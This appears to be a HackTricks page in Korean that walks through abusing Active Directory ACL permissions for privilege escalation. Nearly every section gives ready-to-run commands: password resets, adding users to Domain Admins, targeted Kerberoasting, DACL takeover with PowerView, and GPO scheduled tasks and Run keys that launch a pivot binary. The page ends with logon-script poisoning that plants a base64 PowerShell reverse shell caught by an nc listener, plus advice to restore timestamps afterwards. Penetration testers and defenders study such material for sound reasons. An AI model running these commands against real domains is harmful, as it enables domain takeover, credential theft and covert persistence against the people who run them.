# Active Directory ACLs/ACEs 남용

{{#include ../../../banners/hacktricks-training.md}}

**이 페이지는 주로 다음 기법들의 요약입니다** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **및** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. 자세한 내용은 원문 기사를 확인하세요.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll (사용자에 대한 권한)**

이 권한은 공격자에게 대상 사용자 계정에 대한 전체 제어 권한을 부여합니다. `Get-ObjectAcl` 명령으로 `GenericAll` 권한이 확인되면, 공격자는 다음을 수행할 수 있습니다:

- **대상 계정 비밀번호 변경**: `net user <username> <password> /domain`를 사용하여 공격자는 사용자의 비밀번호를 재설정할 수 있습니다.
- Linux에서는 SAMR을 통해 Samba의 `net rpc`로 동일한 작업을 수행할 수 있습니다:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **계정이 비활성화된 경우, UAC 플래그를 지우세요**: `GenericAll`은 `userAccountControl`을 편집할 수 있게 합니다. Linux에서 BloodyAD는 `ACCOUNTDISABLE` 플래그를 제거할 수 있습니다:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: 사용자 계정에 SPN을 할당하여 kerberoastable 상태로 만든 다음, Rubeus와 targetedKerberoast.py를 사용하여 ticket-granting ticket (TGT) hashes를 추출하고 crack을 시도합니다.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 사용자에 대해 pre-authentication을 비활성화하여 해당 계정을 ASREPRoasting에 취약하게 만듭니다.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: 사용자에 대해 `GenericAll` 권한이 있으면 인증서 기반 자격 증명을 추가하고 비밀번호를 변경하지 않고도 해당 사용자로 인증할 수 있습니다. 참조:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

이 권한은 `Domain Admins`와 같은 그룹에 대해 `GenericAll` 권한을 가진 attacker가 그룹 멤버십을 조작할 수 있게 합니다. `Get-NetGroup`으로 그룹의 distinguished name을 식별한 후, attacker는 다음을 수행할 수 있습니다:

- **Add Themselves to the Domain Admins Group**: 이 작업은 직접 명령을 사용하거나 Active Directory 또는 PowerSploit와 같은 모듈을 사용하여 수행할 수 있습니다.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux에서 또한 BloodyAD를 활용하여 해당 그룹에 대해 GenericAll/Write 멤버십을 보유하고 있으면 임의의 그룹에 자신을 추가할 수 있습니다. 대상 그룹이 “Remote Management Users”에 중첩되어 있으면, 해당 그룹을 존중하는 호스트에서 즉시 WinRM 액세스를 얻습니다:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

컴퓨터 객체 또는 사용자 계정에 이러한 권한을 보유하면 다음을 수행할 수 있습니다:

- **Kerberos Resource-based Constrained Delegation**: 컴퓨터 객체를 탈취할 수 있습니다.
- **Shadow Credentials**: 이 권한을 악용해 shadow credentials를 생성하여 컴퓨터나 사용자 계정을 가장할 수 있습니다.

## **WriteProperty on Group**

사용자가 특정 그룹(예: `Domain Admins`)의 모든 객체에 대해 `WriteProperty` 권한을 가지고 있으면 다음을 수행할 수 있습니다:

- **Add Themselves to the Domain Admins Group**: `net user`와 `Add-NetGroupUser` 명령을 결합해 달성할 수 있으며, 이 방법은 도메인 내에서 privilege escalation을 허용합니다.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

이 권한을 통해 공격자는 그룹 구성원을 직접 조작하는 명령어로 자신을 특정 그룹(예: `Domain Admins`)에 추가할 수 있습니다. 다음 명령어 시퀀스를 사용하면 자신을 추가할 수 있습니다:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

유사한 권한으로, 공격자는 해당 그룹에 대해 `WriteProperty` 권한이 있으면 그룹 속성을 수정하여 자신을 직접 그룹에 추가할 수 있습니다. 이 권한의 확인과 실행은 다음을 통해 수행됩니다:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

`User-Force-Change-Password`에 대한 `ExtendedRight` 권한을 보유하면 현재 암호를 알지 못해도 암호를 재설정할 수 있습니다. 이 권한의 확인과 악용은 PowerShell 또는 기타 명령줄 도구를 통해 수행할 수 있으며, 대화형 세션뿐 아니라 비대화형 환경을 위한 한 줄 명령(one-liners) 등 여러 방법으로 사용자의 암호를 재설정할 수 있습니다. 명령은 간단한 PowerShell 호출에서 Linux의 `rpcclient` 사용에 이르기까지 다양하여 공격 벡터의 다재다능함을 보여줍니다.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

공격자가 그룹에 대해 `WriteOwner` 권한을 가지고 있다는 것을 알게 되면, 해당 그룹의 소유권을 자신으로 변경할 수 있다. 이는 해당 그룹이 `Domain Admins`인 경우 특히 영향이 크며, 소유권 변경을 통해 그룹 속성과 구성원에 대한 더 광범위한 제어가 가능해진다. 이 과정은 `Get-ObjectAcl`을 통해 올바른 객체를 식별한 다음 `Set-DomainObjectOwner`를 사용해 소유자를 `SID` 또는 이름으로 변경하는 것을 포함한다.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

이 권한은 공격자가 사용자 속성을 수정할 수 있도록 허용합니다. 구체적으로, `GenericWrite` 액세스로 공격자는 사용자의 로그온 스크립트 경로를 변경하여 사용자가 로그온할 때 악성 스크립트를 실행하도록 할 수 있습니다. 이는 `Set-ADObject` 명령을 사용하여 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트를 가리키도록 업데이트함으로써 달성됩니다.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

이 권한을 이용하면 공격자는 그룹 멤버십을 조작할 수 있으며, 예를 들어 자신이나 다른 사용자를 특정 그룹에 추가할 수 있습니다. 이 절차는 자격 증명 객체를 생성하고, 이를 사용해 사용자를 그룹에 추가하거나 제거하며, PowerShell 명령으로 멤버십 변경을 확인하는 과정을 포함합니다.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux에서, Samba `net`은 그룹에 대해 `GenericWrite` 권한을 보유하고 있으면 멤버를 추가/삭제할 수 있습니다 (PowerShell/RSAT를 사용할 수 없을 때 유용):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

AD 객체를 소유하고 `WriteDACL` 권한을 가지고 있으면 공격자는 해당 객체에 대해 스스로 `GenericAll` 권한을 부여할 수 있습니다. 이것은 ADSI 조작을 통해 수행되며, 객체에 대한 완전한 제어와 그룹 멤버십을 수정할 수 있는 능력을 제공합니다. 그럼에도 불구하고 Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlets를 사용해 이러한 권한을 악용하려고 할 때에는 제한이 존재합니다.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner 빠른 탈취 (PowerView)

사용자 또는 서비스 계정에 대해 `WriteOwner` 및 `WriteDacl` 권한이 있을 때, 기존 password를 알지 못해도 PowerView를 사용해 계정을 완전히 제어하고 password를 재설정할 수 있습니다:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
참고:
- `WriteOwner`만 있는 경우 먼저 소유자를 자신으로 변경해야 할 수 있습니다:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- 비밀번호 재설정 후 SMB/LDAP/RDP/WinRM 등 어떤 프로토콜로도 접근이 가능한지 검증하세요.

## **Replication on the Domain (DCSync)**

DCSync 공격은 도메인에서 특정 복제 권한을 이용해 도메인 컨트롤러를 흉내 내고 사용자 자격 증명을 포함한 데이터를 동기화합니다. 이 강력한 기법은 `DS-Replication-Get-Changes`와 같은 권한을 필요로 하며, 공격자가 도메인 컨트롤러에 직접 접근하지 않고도 AD 환경에서 민감한 정보를 추출할 수 있게 합니다. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) 관리를 위임된 접근은 심각한 보안 위험을 초래할 수 있습니다. 예를 들어 `offense\spotless` 같은 사용자가 GPO 관리 권한을 위임받으면 **WriteProperty**, **WriteDacl**, **WriteOwner** 같은 권한을 가질 수 있습니다. 이러한 권한은 PowerView를 사용하여 식별된 것처럼 악용될 수 있습니다: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

GPO가 잘못 구성되어 있는지 식별하려면 PowerSploit의 cmdlets를 연계해서 사용할 수 있습니다. 이를 통해 특정 사용자가 관리 권한을 가진 GPO를 발견할 수 있습니다: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**지정된 정책이 적용된 컴퓨터**: 특정 GPO가 적용되는 컴퓨터를 확인하면 잠재적 영향을 이해하는 데 도움이 됩니다. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**특정 컴퓨터에 적용된 정책**: 특정 컴퓨터에 어떤 정책이 적용되었는지 확인하려면 `Get-DomainGPO` 같은 명령을 사용할 수 있습니다.

**지정된 정책이 적용된 OU**: 특정 정책의 영향을 받는 조직 단위(OU)를 식별하려면 `Get-DomainOU`를 사용할 수 있습니다.

또한 도구 [**GPOHound**](https://github.com/cogiceo/GPOHound)를 사용하여 GPO를 열거하고 문제를 찾아볼 수 있습니다.

### Abuse GPO - New-GPOImmediateTask

잘못 구성된 GPO는 즉시 실행되는 scheduled task를 생성하는 등 코드 실행을 위해 악용될 수 있습니다. 예를 들어 영향을 받는 컴퓨터에서 로컬 Administrators 그룹에 사용자를 추가하면 권한을 크게 상승시킬 수 있습니다:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module이 설치되어 있으면 새로운 GPOs를 생성 및 연결하고, 영향을 받는 컴퓨터에서 backdoors를 실행하도록 registry values와 같은 preferences를 설정할 수 있습니다. 이 방법은 GPO가 업데이트되고 사용자가 컴퓨터에 로그인해야 실행됩니다:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse는 새로운 GPOs를 만들 필요 없이 작업을 추가하거나 설정을 수정하여 기존 GPOs를 악용하는 방법을 제공합니다. 이 도구는 변경을 적용하기 전에 기존 GPOs를 수정하거나 RSAT 도구를 사용해 새로운 GPOs를 생성해야 합니다:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 정책 강제 업데이트

GPO 업데이트는 일반적으로 약 90분마다 발생합니다. 이 프로세스를 빠르게 진행하려면, 특히 변경을 적용한 직후에 대상 컴퓨터에서 `gpupdate /force` 명령을 사용하여 즉시 정책 업데이트를 강제할 수 있습니다. 이 명령은 다음 자동 업데이트 주기를 기다리지 않고 GPOs에 대한 수정 사항이 적용되도록 보장합니다.

### 내부 동작

특정 GPO의 Scheduled Tasks를 검사하면 `Misconfigured Policy`와 같은 경우 `evilTask` 같은 작업이 추가된 것을 확인할 수 있습니다. 이러한 작업은 시스템 동작을 변경하거나 권한을 상승시키려는 스크립트나 명령줄 도구를 통해 생성됩니다.

작업의 구조는 `New-GPOImmediateTask`로 생성된 XML 구성 파일에 나타나 있으며, 실행할 명령과 트리거를 포함한 예약 작업의 세부 사항을 설명합니다. 이 파일은 GPOs 내에서 예약된 작업이 어떻게 정의되고 관리되는지를 나타내며, 정책 시행의 일환으로 임의의 명령이나 스크립트를 실행하는 방법을 제공합니다.

### Users and Groups

GPOs는 대상 시스템에서 사용자 및 그룹 구성원의 조작도 허용합니다. Users and Groups 정책 파일을 직접 편집함으로써 공격자는 로컬 `administrators` 그룹과 같은 권한이 있는 그룹에 사용자를 추가할 수 있습니다. 이는 GPO 관리 권한의 위임을 통해 가능하며, 정책 파일을 수정하여 새 사용자를 포함하거나 그룹 구성원을 변경할 수 있게 합니다.

Users and Groups용 XML 구성 파일은 이러한 변경이 어떻게 구현되는지 개략을 보여줍니다. 이 파일에 항목을 추가함으로써 특정 사용자에게 영향을 받는 시스템 전반에 걸쳐 권한을 부여할 수 있습니다. 이 방법은 GPO 조작을 통한 직접적인 권한 상승 방법을 제공합니다.

또한 logon/logoff 스크립트 활용, autorun을 위한 레지스트리 키 수정, .msi 파일을 통한 소프트웨어 설치, 서비스 구성 편집 등 코드 실행이나 지속성 유지를 위한 추가적인 방법들도 고려할 수 있습니다. 이러한 기술은 GPOs 남용을 통해 접근을 유지하고 대상 시스템을 제어할 수 있는 다양한 경로를 제공합니다.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### 로그온 스크립트 찾기
- 구성된 로그온 스크립트에 대해 사용자 속성을 검사합니다:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- domain shares를 크롤링하여 shortcuts 또는 scripts에 대한 참조를 찾아냅니다:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` 파일을 파싱하여 SYSVOL/NETLOGON을 가리키는 대상 경로를 파악함 (유용한 DFIR 트릭이자 직접 GPO 접근 권한이 없는 공격자에게 유용함):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound는 사용자 노드에 `logonScript` (scriptPath) 속성이 있으면 표시합니다.

### 쓰기 권한 확인 (공유 목록을 믿지 마세요)
자동화 도구는 SYSVOL/NETLOGON을 읽기 전용으로 표시할 수 있지만, 기본 NTFS ACL은 여전히 쓰기를 허용할 수 있습니다. 항상 테스트하세요:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
파일 크기(file size)나 mtime이 변경되면 write 권한이 있습니다. 수정하기 전에 원본을 보존하세요.

### Poison a VBScript 로그온 스크립트로 RCE
PowerShell reverse shell (revshells.com에서 생성)를 실행하는 명령을 append하고, 비즈니스 기능이 중단되지 않도록 원래 로직을 유지하세요:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
호스트에서 listen하고 다음 대화형 로그온을 기다립니다:
```bash
rlwrap -cAr nc -lnvp 443
```
노트:
- 실행은 로깅된 사용자의 token (not SYSTEM)으로 수행됩니다. 범위는 해당 스크립트를 적용하는 GPO 링크(OU, site, domain)입니다.
- 사용 후 원래 내용과 타임스탬프를 복원하여 정리하세요.


## 참고자료

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
